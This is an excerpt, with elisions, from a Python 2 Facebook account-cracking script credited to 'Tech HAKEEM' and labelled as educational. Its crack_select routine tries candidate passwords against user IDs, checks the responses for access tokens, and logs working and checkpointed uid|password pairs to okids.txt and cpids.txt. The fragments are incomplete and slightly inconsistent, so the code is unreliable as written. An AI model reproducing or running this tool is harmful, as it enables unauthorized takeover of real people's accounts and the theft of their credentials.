#Script Given By Tech HAKEEM
#Script Is Given For Educational Purpose
#Script Edited By @Hakeem
#Utf-8 python 
...
\n\033[0m-----------------------------------------------
\033[1;92mAuthor \033[1;93m: Abdul Hakeem
\033[1;92mFb \033[1;93m: Abdul Hakeem Chachar
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[HAKEEM-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[HAKEEM-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;31m[HAKEEM-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[HAKEEM-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks TechQaiser.& Also SyedZada Bro
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
...
#Thanks TechQaiser & Also ABDUL HAKEEM Bro
